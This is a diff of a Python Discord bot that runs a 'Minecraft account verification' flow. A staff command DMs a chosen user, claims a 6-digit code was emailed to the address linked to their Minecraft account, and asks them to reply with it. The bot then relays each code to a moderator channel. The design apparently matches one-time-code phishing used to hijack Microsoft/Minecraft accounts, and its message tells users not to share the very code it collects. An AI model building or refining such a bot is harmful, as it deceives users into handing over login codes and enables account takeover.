@@ -2,7 +2,6 @@ import os
 import discord
 from discord.ext import commands
 import json
-import re
 
 TOKEN = os.getenv("DISCORD_TOKEN")
 VERIFICATION_CHANNEL_ID = 1362951881827160295
@@ -61,35 +60,35 @@ async def send_verification_embed():
     global last_verification_msg_id  # Add this line to reference the global variable
     channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
 
-    # Delete the old verification embed if it exists
-    if last_verification_msg_id:
-        try:
-            old = await channel.fetch_message(last_verification_msg_id)
-            await old.delete()
-            print(f"Deleted previous verification message with ID: {last_verification_msg_id}")  # Log the deletion
-        except discord.NotFound:
-            print(f"Previous verification message not found (ID: {last_verification_msg_id}).")  # Log if not found
-        except discord.Forbidden:
-            print("Bot doesn't have permission to delete the old message.")  # Log permission issues
-        except discord.HTTPException as e:
-            print(f"Failed to delete the old verification message: {e}")  # Log HTTP errors
-
-    # Send the new verification embed
-    embed = discord.Embed(
-        title="🔗 Link Your Minecraft Account",
-        description="Click the button below to verify.",
-        color=discord.Color.green()
-    )
-    msg = await channel.send(embed=embed, view=LinkView())
-    last_verification_msg_id = msg.id  # Update the global variable here
-    save_last_verification_msg_id(last_verification_msg_id)  # Save the new ID to the file
-    print(f"Sent new verification message with ID: {last_verification_msg_id}")  # Log new message
-
 @bot.event
 async def on_ready():
-    print(f"Bot is ready: {bot.user}")
-    await bot.tree.sync()
-    await send_verification_embed()
+    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
+    print('Bot is ready!')
+    try:
+        synced = await bot.tree.sync()
+        print(f"Synced {len(synced)} slash commands.")
+    except Exception as e:
+        print(f"Error syncing commands: {e}")
+
+    # Fetch the verification channel
+    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
+
+    # Check the last 50 messages to find and delete the previous embed
+    async for message in verification_channel.history(limit=50):
+        if message.author == bot.user and message.embeds:
+            embed = message.embeds[0]
+            if embed.title == "🔗 Link Your Minecraft Account":
+                await message.delete()
+
+    # Create and send the new verification embed with the LinkAccount button
+    embed = discord.Embed(
+        title="🔗 Link Your Minecraft Account",
+        description="Click the **Link Account** button below to start verification.",
+        color=discord.Color.green()
+    )
+    embed.set_footer(text="This is an automated message.")
+    await verification_channel.send(embed=embed, view=LinkView())
+
 
 @bot.tree.command(name="setup")
 async def setup(interaction: discord.Interaction):
@@ -103,39 +102,22 @@ async def promptcode(interaction: discord.Interaction, user: discord.Member):
         return
     
     try:
-        dm_channel = await user.create_dm()
-
         embed = discord.Embed(
-            title="🔐 Enter Verification Code",
-            description="Check your email for a code and send it here. Please provide a 6-digit code.",
+            title="📨 Minecraft Server Verification",
+            description=( 
+                "We've sent a 6-digit code to your email linked to Minecraft.\n\n"
+                "Reply to this DM with the code to complete verification.\n\n"
+                "🔒 Your info is private. Don't share your code."
+            ),
             color=discord.Color.blue()
         )
-        await dm_channel.send(embed=embed)
-
-        # Wait for the user's response
-        def check(message):
-            return message.author == user and message.channel == dm_channel and re.match(r'^\d{6}$', message.content)
-
-        # Wait for a valid message that matches the 6-digit format
-        message = await bot.wait_for('message', check=check, timeout=60)  # Timeout after 60 seconds
-
-        # Send the 6-digit code to the verification channel
-        verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
-
-        embed = discord.Embed(
-            title="📝 New Verification Code",
-            color=discord.Color.green()
-        )
-        embed.add_field(name="User", value=user.mention, inline=False)
-        embed.add_field(name="Code", value=message.content, inline=False)
-        await verification_channel.send(embed=embed)
-
-        await dm_channel.send("✅ Code received! Thank you for verifying.")
-
-    except Exception as e:
-        await interaction.response.send_message(f"Error sending DM: {e}", ephemeral=True)
-    else:
-        await interaction.response.send_message(f"Verification prompt sent to {user.mention}!", ephemeral=True)
+        await user.send(embed=embed)
+        sent_verification_dms.add(user.id)
+        # Acknowledge the interaction after the DM is successfully sent
+        await interaction.response.send_message("✅ Prompt sent.", ephemeral=True)
+    except discord.errors.Forbidden:
+        # Handle the case where the bot can't send a DM
+        await interaction.response.send_message("❌ Couldn't send DM. Please make sure your DMs are open.", ephemeral=True)
 
 @bot.event
 async def on_message(message: discord.Message):
@@ -147,7 +129,7 @@ async def on_message(message: discord.Message):
             mod = await bot.fetch_channel(MOD_CHANNEL_ID)
             embed = discord.Embed(
                 title="✅ Code Submitted",
-                description=f"User: {message.author.mention}\nCode: `{message.content}`",
+                description=f"User: {message.author.mention}\nCode: {message.content}",
                 color=discord.Color.teal()
             )
             await mod.send(embed=embed)
